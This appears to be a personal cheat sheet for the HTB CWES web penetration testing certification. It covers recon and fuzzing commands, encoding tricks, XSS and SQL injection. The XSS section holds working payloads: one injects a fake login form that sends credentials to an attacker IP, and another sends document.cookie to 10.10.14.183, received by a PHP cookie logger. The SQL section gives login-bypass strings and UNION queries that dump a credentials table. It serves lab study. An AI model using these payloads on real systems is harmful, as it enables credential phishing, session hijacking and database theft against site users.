# HTB CWES (Notes/Cheat Sheet)

## Notes (Things to Keep in Mind)

1. Run **ReconSpider** by HTB to gather information and email addresses:

   * https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
2. Run **VHost fuzzing** and **subdomain brute-forcing**:

   ```bash
   dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
   ```

   Perform both multiple times.
3. Run **directory fuzzing** on all discovered VHosts and execute **ReconSpider** again.
4. Continue expanding reconnaissance based on newly discovered assets.
5. Keep fuzzing till end (don't stop) sometimes we think we got it but it can be a rebbit hole.
6. Fuzz all the things
  - vhost fuzzing (Recursive if nothing has found)
  - directory fuzzing (recursive)
  - parameter fuzzing (Both GET and POST)
  - parameter value fuzzing (Both GET and POST)
  - If API endpoint found then, fuzz for more endpoints with webfuzz_api tool

---

## HTTPS Communication and Certificate Handling

1. User visits `http://yash.com`
2. Server redirects to HTTPS (`301`)
3. Browser connects to `https://yash.com`
4. Server sends its certificate and public key
5. Browser verifies the certificate
6. Browser creates a random secret key
7. Browser encrypts the secret key using the server's public key and sends it
8. Server decrypts it using its private key
9. Both now share the same secret
10. Both generate the same session key
11. The session key is used to encrypt all HTTPS communication, including passwords, cookies, and authentication tokens

---

## Client-Side Vulnerabilities

1. **View Source Code**

   * Look for credentials, API keys, comments, or any sensitive information.
   * Spend time thoroughly reviewing the source.

2. **HTML Injection / XSS**

   * Test for input validation weaknesses.
   * Check whether user input is reflected or stored without proper sanitization.

3. **CSRF**

   * Identify the authentication and authorization mechanisms used by the application.
   * If cookies are used, check the `SameSite` attribute.
   * Verify whether anti-CSRF tokens are implemented.

---

## Back-End Server Stacks

```text
LAMP   Linux, Apache, MySQL, and PHP
WAMP   Windows, Apache, MySQL, and PHP
WINS   Windows, IIS, .NET, and SQL Server
MAMP   macOS, Apache, MySQL, and PHP
XAMPP  Cross-Platform, Apache, MySQL, and PHP/PERL
```

---

## Zone Transfer Check

```bash
# Get the name servers
dig domain.com NS

# Attempt a zone transfer
dig axfr @nameserver domain.com
```

---

## VHost Fuzzing

```bash
gobuster vhost -u http://inlanefreight.htb:81 \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
--append-domain \
--domain DOMAIN-HERE
```

---

## crt.sh Enumeration

```bash
curl -s "https://crt.sh/?q=facebook.com&output=json" | \
jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | \
sort -u
```

---

## Well-Known URLs

Check the following files under the `/.well-known/` directory:

```text
/.well-known/security.txt
/.well-known/mta-sts.txt
/.well-known/assetlinks.json
/.well-known/openid-configuration
/.well-known/change-password
```

---

## Spider Tool

**ReconSpider.py** by HTB

Review `results.json`, which may contain useful information such as:

* Email addresses
* Comments
* Internal links
* Metadata

---

## Google Dorking

Reference:
https://www.exploit-db.com/google-hacking-database

### Finding Login Pages

```text
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
```

### Identifying Exposed Files

```text
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)
```

### Uncovering Configuration Files

```text
site:example.com inurl:config.php
site:example.com (ext:conf OR ext:cnf)
```

### Locating Database Backups

```text
site:example.com inurl:backup
site:example.com filetype:sql
```

---

## Final Recon (Automating Reconnaissance)

```bash
ffuf -u http://inlanefreight.htb:30494 \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-mc 200,403 \
-t 60 \
-H "Host: FUZZ.inlanefreight.htb" \
-ac
```

---

## Domain Brute-Forcing

```bash
dnsenum --enum inlanefreight.com \
-f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
-r
```

---

## Web Fuzzing

### Tools

* Gobuster
* Feroxbuster
* Wenum / Wfuzz
* FFUF

---

## Recommended Wordlists (HTB)

### Common Content Discovery

```text
Discovery/Web-Content/common.txt
```

A general-purpose wordlist containing common directory and file names. Excellent as a starting point.

### Medium Directory Discovery

```text
Discovery/Web-Content/directory-list-2.3-medium.txt
```

A larger wordlist focused on discovering directories.

### Large Directory Discovery

```text
Discovery/Web-Content/raft-large-directories.txt
```

A comprehensive directory wordlist compiled from multiple sources.

### Comprehensive Discovery

```text
Discovery/Web-Content/big.txt
```

A massive wordlist containing both file and directory names.

---

## FFUF Recursive Directory Fuzzing

```bash
ffuf -u https://target.com/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.asp,.aspx,.jsp,.js,.txt,.html,.bak,.zip,.tar.gz,.old,.conf,.config,.json,.xml \
-recursion \
-recursion-depth 2 \
-ac -c \
-t 100 \
-timeout 10 \
-x http://127.0.0.1:8080 \
-mc 200,201,202,204,301,302,307,308,401,405,500 \
-fc 400,403
```

### Useful FFUF Flag

```text
-ic
```

Use `-ic` to ignore comments.

---

## Feroxbuster Example

```bash
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://94.237.55.43:40444/ -x .php,.asp,.aspx,.jsp,.js,.txt,.html,.bak,.zip,.tar.gz,.old,.conf,.config,.json,.xml -t 200 -C 400,404
```

---

## Parameter Fuzzing with CLI Tools

### GET Parameter Fuzzing

```bash
wenum \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
--hc 404 \
-u "http://IP:PORT/get.php?x=FUZZ"
```

Fuzzes parameter values using Wenum/Wfuzz.

### POST Parameter Fuzzing

```bash
ffuf -u http://IP:PORT/post.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "y=FUZZ" \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc 200 \
-v
```
#### Virtual Host Fuzzig with GoBuster
`echo "IP inlanefreight.htb" | sudo tee -a /etc/hosts` # add the IP address in hosts file with domain name

`gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain` # fuzz the vhosts using this command

#### GoBuster Subdomain Fuzzing
`gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` # subdomain fuzzing using gobuster command

#### Filtering Fuzzing Output

Use filters to reduce noise and focus on interesting results.

**Gobuster**
- `-s` → Show status codes
- `-b` → Hide status codes
- `--exclude-length` → Hide responses by size

**FFUF**
- `-mc` / `-fc` → Match / Filter status codes
- `-ms` / `-fs` → Match / Filter response size
- `-mw` / `-fw` → Match / Filter word count
- `-ml` / `-fl` → Match / Filter line count
- `-mt` → Match response time (TTFB)

**Wenum**
- `--sc` / `--hc` → Show / Hide status codes
- `--ss` / `--hs` → Show / Hide size
- `--sw` / `--hw` → Show / Hide word count
- `--sl` / `--hl` → Show / Hide line count
- `--sr` / `--hr` → Show / Hide regex matches

**Feroxbuster**
- `-s` / `-C` → Include / Exclude status codes
- `-S` → Filter size
- `-W` → Filter words
- `-N` → Filter lines
- `-X` → Filter regex
- `--dont-scan` → Skip paths
- `--filter-similar-to` → Remove similar responses

> Common workflow: Filter `404s`, then refine by `size`, `words`, `lines`, or `regex` to find unique responses.

**curl command with parameter will get the result with this** 
`curl -X POST "http://IP:PORT/post.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "y=SUNWmc" \
  -v`

**API Fuzzing**

> Tool for fuzzing an API endpoints

`git clone https://github.com/PandaSt0rm/webfuzz_api.git ; cd webfuzz_api ; pip3 install -r requirements.txt` 
`python3 api_fuzzer.py http://IP:PORT`

### Javascript Deobfuscation

Following website can be used for deobfuscation

https://matthewfl.com/unPacker.html # for Deobfuscation

https://www.boxentriq.com/analysis/cipher-identifier # for identifying an encoding used by application

**Encoding and decoding Base64**

`echo Yash | base64` # this command can be used for encoding in base64

`echo WWFzaA== | base64 -d ` # this command can be used for decoding base64 string

**Encoding and decoding HEX**

`echo Yash | xxd -p` # For encoding the data into HEX

`echo 59617368 | xxd -p -r` # For Decoding the HEX string

**Caesar/Rot13 Encoding and Decoding**

`echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'` # For encoding

`echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'` # For Decoding


### Cross-site scripting (XSS)

In a mobile application, the app may sometimes use a WebView to embed a web application inside an Android or iOS application. By using the following payload:

`<script>alert(window.origin)</script>` 

> we can determine where exactly our payload is being executed, helping us pinpoint the execution context or location. 

`<script>print()</script>` # print() is not blocked by any browser

**R XSS**

> Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized.

**Attacks**
1. Stored XSS to web application defacing attack
2. (phishing section) If we have found an xss on the login page then we can write an script that will get us the credentials of the other users (Rxss)
   `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`
> (2) this one is the minfied version of the payload
3. `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`
> (3) In this we are removing that feature in which we were hiding that fuction.

- **Phisings steps**
i. Find an RXSS vulnerability, then inject a login form as a payload, as shown in step (3). The payload should contain the IP of the server (which we can obtain by using the ip a command to find tun0). Then enter the payload (don't hit enter yet).
ii. Run the server using this command: sudo php -S tun0_IP:80, then hit enter on the payload that we entered earlier.
iii. Then observe — we will receive the username and password on the terminal.

**Plances where Blind XSS Can be found**
- Contact Forms
- Reviews
- User Details
- Support Tickets
- Http User-Agent Header
- Also places where we need to wait for approval (admin will check and approve places)

**Step for blind XSS**
1. Identify the parameter # `"><script src="http://OUR_IP/username"></script>` # username is the parameter name in which we are putting this payload
2. create a 2 files 1st is script.js with this payload `new Image().src='http://10.10.14.183/index.php?c='+document.cookie` and 2nd is index.php with following content
`<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>` In the one location and then run the the shell like a `sudo php -S IP:80`

3. use this payload in the vulnerable parameter `'><script src=http://10.10.15.62/script.js></script>` then in the terminal we will receive an cookie of the admin
4. we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
`DOM.innerHTML, DOM.outerHTML, document.write(), document.writeln(), document.domain`


## SQL Injection
Command Line

TIP:
Every Query Should Be End with ; (semicolumn)

***MySQL***
`mysql -u root -p` # By using this command we will get an option to put password
`mysql -u root -p<password>` # for directly entering in Mysql dbms without storing it anywhere/cleartext/logs/terminal History
`mysql -u root -h docker.hackthebox.eu -P 3306 -p`  # in this command -P is for port and -h for defining the host

*creating a database*
`CREATE DATABASE users;` # creating users database in MySQL 
`SHOW DATABASES;` # for listing out all the databases
`USE users;` # we can switch the database using this command (users is a database) 
`CREATE TABLE logins ( id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME );` # this query will create an login table (do AI For more)
`SHOW TABELS;` # list out all the tables inside the databases
`DESCRIBE logines;` # used to list the table structure with its fields and data types. (logines is a table name FYI)

*Table Properties*

AUTO_INCREMENT → The id number goes up by 1 automatically for each new row.
NOT NULL → This column cannot be left empty (it’s required).
UNIQUE → No two rows can have the same value in this column (e.g., no duplicate usernames).
DEFAULT NOW() → If you don’t enter a date, it automatically uses the current date & time.
PRIMARY KEY (id) → The id column becomes the unique identifier for each row.

### command for connecting mysql server on diff host 
mysql -h 154.57.164.65 -P 32755 -u root -ppassword --skip-ssl-verify-server-cert # --skip-ssl-verify-server-cert for skipping the ssl/tls -h for hostname/IP

#### Insert Statement in MySQL

`INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);` # used to add a new record to the table
`mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');` # we are inserting some data into the login tables


`INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);` # rules like how to write a statement below is the actual example
`INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');` # updating specific columns in this case username and password (logins is that table name)
`mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');` # We can also add multiple recodes at once by seprating them with a comma

#### Select Statment
`SELECT * FROM table_name;` # the genral syntaxt to view entire table
`SELECT column1, column2 FROM table_name;` # we can view data present in specific columns as well


#### Drop statement
Basically we can use this to remove tables and databases from server
`DROP TABLE logins;` # for removing the table called logins from the database

#### Alter statement
We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. 

`ALTER TABLE logins ADD newColumn INT;` # this adds a new column newColumn to the logins table using ADD
`mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;` # To rename a column, we can use RENAME COLUMN
`mysql> ALTER TABLE logins MODIFY newerColumn DATE;` # We can also change a column's datatype with MODIFY
`ALTER TABLE logins DROP newerColumn;` # we can also drop an coulmn from a table using a Drop with alter statement

#### Update Statement
UPDATE statement can be used to update specific records within a table, based on certain conditions.

`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;` # general syntax 
`mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;` # We specify the table name, each column and its new value, and the condition for updating records. The query above updated all passwords in all records where the id was more significant than 1.

Ans for the lab:
mysql -h 154.57.164.65 -P 32755 -u root -ppassword --skip-ssl-verify-server-cert # first authenticated 
SHOW DATABASES; # list databases
USE employees; # use the database which we want in this case employees
show tables; # list out tables from the database
SELECT * FROM developement # view all the info from the developement table



*Query Results*

We will learn how to control the results of any SQL query.

*WHERE Clause*

To filter or search for specific data, we can use conditions with the SELECT statement and the WHERE clause to fine-tune the results.

*LIKE Clause*

*SQL Operators*

- Division (/), Multiplication (*), and Modulus (%)
- Addition (+) and subtraction (-)
- Comparison (=, >, <, <=, >=, !=, LIKE)
- NOT (!)
- AND (&&)
- OR (||)

*Subverting Query Logic*

*Using comments*

*Union Clause*

Things to keep in mind:
- Same number of columns on both sides? (both left and right side)
- Using NULL for filler to avoid type errors? (e.g., `select * from employees UNION SELECT *,1,1,1,1,1 FROM DEPARTMENT;`)
- Found which columns are visible on screen?
- Hidden original results (e.g., id=-1)?

---

**All SQL commands (copy them all at once):**

```sql
mysql> SELECT * FROM logins ORDER BY password;                          # We can sort the results by using ORDER BY
mysql> SELECT * FROM logins ORDER BY password DESC;                 # We can also sort the results by ASC or DESC
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;        # It is also possible to sort by multiple columns to have a secondary sort for duplicate values in one column
mysql> SELECT * FROM logins LIMIT 2;                               # We can limit the results by rows, like in this case only 2 rows
mysql> SELECT * FROM logins LIMIT 1, 2;                            # If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count
mysql> SELECT * FROM logins WHERE id > 1;                         # In this case, we want output where id must be greater than 1
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';         # The query retrieves all records with usernames starting with admin (the % symbol acts as a wildcard)
mysql> SELECT * FROM logins WHERE username LIKE '___';           # It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. (This query will fetch all usernames that have 3 characters.)
SELECT * FROM employees WHERE username LIKE 'Bar%';              # Lab answer
mysql> SELECT * FROM logins WHERE username != 'john';            # Using symbol for NOT operator
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1; # Selects users who have their id greater than 1 AND username NOT equal to 'john'
SELECT * FROM titles WHERE emp_no > '10000' OR title NOT LIKE '%engineer%'; # Answer for the lab
SELECT * FROM logins WHERE username='' AND password = '';       # If we put ' OR '1'='1 in both fields, we log in as admin (because both conditions are true). AND is executed first in SQLi, then OR.
tom'#                                                           # Payload for logging in as a different user
SELECT * FROM logins WHERE (username='') AND password = '098f6bcd4621d373cade4e832627b4f6');
') OR id = 5 #                                                  # First, close the parenthesis, then use the OR operator, set id=5, and comment out everything.
select * from employees UNION SELECT *,1,1,1,1,1 FROM DEPARTMENT; # Example using NULL as filler


*Database Enumeration*
*Note:*
1. If application is running on the apache/niginx then there is high chance that it is running MySQL
2. If it's running on the IIS then it's a high chance tht it is running on the MSSQL

`SELECT @@version` # for getting an version of the MYSQL
`SELECT POW(1,1)` # IN MYSQL we will get the 1, In other dbms we will get an error
`SELECT SLEEP(5)` # it will work on the MYSQL, In other dbms application will not delay it's response

*INFORMATION_SCHEMA Database*
*Note:*
To dump the data from dbms using union query, we much have dbms, table and column names, so insted of this, we can use the INFORMATION_SCHEMA Database method
INFORMATION_SCHEMA is a special database that stores information about other databases, tables, columns, etc.


*SCHEMATA*
The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. he SCHEMA_NAME column contains all the database names currently present.
`mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;` # query for listing out all the available database from the server

The following Database is common.
mysql
information_schema
performance_schema
 # after this whatever comes is actual database.

*MUST KEEP IN MIND WHILE EXPLOITING AN UNION BASED MANULLY*
1. we need to use the special charector that is used for breaking a query befor fiding out the exact number of cloumn is used
	ex: ' order by 1-- -
2. we need to use some test data befor the special chars while retriving data from database using union
	ex: cn' UNION select 1,@@version,3,4-- - # in this case cn is the test data cn' QUERY


`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` # query for listing out the databases using the information_schema method
`cn' UNION select 1,database(),2,3-- -` # we can find the current databse which applicatin is using, by using this function database().
`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` # this command can be used to list out all the available tables in the dev database.
`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` # to get the column Information of the credentials table from dev db.
`cn' UNION select 1, username, password, 4 from dev.credentials-- -` # after getting the column names then we can dump then using this command 





